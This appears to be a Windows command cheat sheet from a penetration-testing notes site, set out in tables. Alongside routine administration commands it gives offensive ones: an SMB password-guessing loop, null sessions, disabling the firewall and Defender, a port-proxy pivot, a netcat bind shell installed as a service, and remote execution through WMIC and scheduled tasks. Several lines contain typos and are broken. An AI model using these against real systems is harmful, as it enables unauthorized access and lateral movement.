---
title: Windows Commands
category: Misc
order: 4
---

>**Accounts and Privileges**

Topic | Command
------------- | -------------
Lauch with Admin Privs | ctrl+shift+enter 
SID | S-[revision level]-[authority level]-[domain/computer]-RID
Admin RID | 500
Guest RID | 501 
Users RID | 1001 and up
Add or Remove a User | net user [username] [password] /add or /del <br> termservice, telnet
Add or Remove user to a group | net localgroup [group] [username] /add or /del <br> Examples: <br> Remote Desktop Users, TelnetClients, Administrators
List Local Users | net user
List Groups | net localgroup
List Administrators | net localgroup administrators 
List Account Policy | net accounts or net accounts /domain
Password Guess | for /f %i in 9password.lst) do @echo %i & @net use \\[tartet_IP_addr] %i /u:[UserName] 2>nul && echo [UserName]: %i >> success.txt
Run Progarm as another user | runas /u:fred "cmd /c echo Hello!", runas /smartcard "cmd /c echo Hello!"

>**Antivirus**

Topic | Command
------------- | -------------
Turn off Windows Defender | control /name Microsoft.WindowsDefender
Turn off Smart Screen | control /name Microsoft.ActionCenter

>**Inventory, File Search, and Counting**

Topic | Command
------------- | -------------
Count Lines | <code> type "file" | find /c /v "" </code>
Inventory Software | dir /s ""c:\Program Files"" > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt
Display File Contents | type [file], type *.[ext], type [file1] [file2]
Search in FIle | <code> type [file] | find /i "[string]", type [file] | findstr [regex] </code>
See Environment Variables | set, set [variable_name] <br> Example: username, path
Search for File | dir /b /s [directory]\[file]  (use ^ to escape spaces) <br> Example: dir /b /s %systemroot%\hosts
Read Registry Key | reg query [keyName] 
Change Registry Key | reg add [KeyName] /v [ValueName] /t [type] /d [data]
Export Registry Keys | reg export [keyName] [filename.reg] 
Import Registry Keys | reg import [filename.reg]
Find a String  | find "[string]", findstr [regex]

>**Inventory, File Search, and Counting**

Topic | Command
------------- | -------------
Network Activity | <code> netstat -na | find ":[port]"</code> 
DNS cahce | <code> ipconfig /displaydns </code>
Turn firewall off | <code> netsh advfirewall set allprofiles state off </code>
Firewall Rule | <code> netsh advfirewall firewall add rule name="[name]" <br> dir=in action=allow remoteip=[yourIPaddress] protocol=TCP localport=[port number] <br> Example: 3389, 23 </code>
Delete Firewall Rule | <code> netsh advfirewall firewall del rule name="[name]" 
Disable Firewall | <code> netsh advfirewall set allprofiles state off 
Firewall Rule Registry | <code> reg add HKLM\ SYSTEM\ CurrentControlSet\ Services\ SharedAccess\ Parameters\ FirewallPolicy\ StandardProfile\ GloballyOpenPorts\ List /V 2000:TCP /T REG_SZ /F /D "2000:TCP:*:Enabled" 
View Firewall Configuration | netsh advfirewall show allprofiles 
Ping Sweep | <code> for /L %i in (1, 1, 255) do @ping -n 1 192.168.2.%i | find "TTL" </code>
DNS Lookup | <code> for /L %i in (1, 1, 255) do @echo 10.10.10.%i & nslookup 10.10.10.%i  2>nul | find "Name" </code>
 Netsh pivot | <code> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=[RPORT] connectaddress=[RHOST] </code>

>**Process and Services**

Topic | Command
------------- | -------------
Install a service | <code> pkgmgr /iu:""[servicename]"" <br> dism /online /Enable-Features /FeatureName:TelnetServer </code>
List Running Services | <code> sc query </code>
List All Services | <code> sc query state= all </code>
List Remote Services  | <code> sc \\[targetIP] query </code>
Check status of service | <code> sc query [service name] </code>
Start/Stop a service | <code> sc start/stop [service name] </code>
Change Startup type of service | <code> sc config [servicename] start= demand (termservice, telnet) </code>
Delete Service | <code> sc delete [service name] </code>
List Processes | <code> tasklist </code>
Kill a Process | <code> taskkill /PID [process_ID] </code>

>**Remote Access, SMB, and WMIC**

Topic | Command
------------- | -------------
See Current Privileges | <code> whoami </code>
Windows null session | <code> net use \\targetip "" /u:"" </code> 
Establish an SMB session | <code> net use \\[targetIP] [password] /u:[user] </code>
Mount a Share on Target | <code> net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] </code>
Dropping SMB Session | <code> net use \\[targetIP] /del <br> net use * /del </code>
Run a Remote Command | <code> sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe </code> 
Turn on Remote Desktop / terminal services | <code> reg add "hklm\ system\ currentcontrolset\ control\ terminal server" /v fdenysconnetions /t reg_dword /d 0 </code>
Remote Registry  | <code> Put \\[MachineName] before [KeyName] </code> 
WMIC Invoke Porgram | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] </code>
WMIC on Multiple Machines | <code> /node:@[filename] - run a command on multiple machines listed in a file </code> 
WMIC Service Query | <code> wmic services where (displayname like "%[whatever]%") get name </code> 
WMIC List Processes | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief </code> 
WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process where name="[name]" delete or processID="[PID]" delete </code>
WMIC Monitor Process | <code> wmic process where name="[name]" list brief /every:1 | "nc.exe" </code>
at (windows 7 and lower)(all commands at SYSTEM) | <code> net use \\[targetIP] [password] /u:[admin_user] <br> <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> <br> *sc \\[targetIP] start schedule* <br> <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> <br> at \\[targetIP} (*check status*) </code> 
schtasksStart time <br> <i> HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE </i> | <code> net use \\[targetIP] [password] /u:[admin_user] <br> <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> <br> *sc \\[targetIP] start schedule* <br> <br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command] <br> <br> schtasks /query /s [targetIP] </code> 
Simple Windows IIS Express Server | <code> C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\tools /port:8001 </code> 


>**Scripting and Shell**

Topic | Command
------------- | -------------
Navigate History | <code> F7  Scripting and Shell </code> 
For Loops | <code> for /L %i in ([start], [step], [stop]) do [command]) <br> *note: step of zero runs forever*  <br> for /L %i in (1, 1, 255) do echo %i </code>
For Loops Iterate | <code> for /F ["options"] %i in ([stuff]) do [command] </code>  
Pause/Break | <code> timeout /t 4 /nobreak </code>  
Turn off command echo | <code>  @ - for /L %i in (1, 1, 255) do @echo %i </code> 
Multiple Commands | & | <code> for /L %i in (1, 1, 255) do @echo %i & timeout /t 4 /nobreak </code> 
Multiple Successful Commands | <code>  && </code> 
Throw Away Output | <code> >nul - for /L %i in (1, 1, 255) do @echo %i & timeout /t 4 /nobreak > null </code> 
Print Blank Line or Beap | <code> echo., echo CTRL-G </code> 
CR/LF (0d0a) | <code> Windows use CR/LF as EOF characters. </code>  

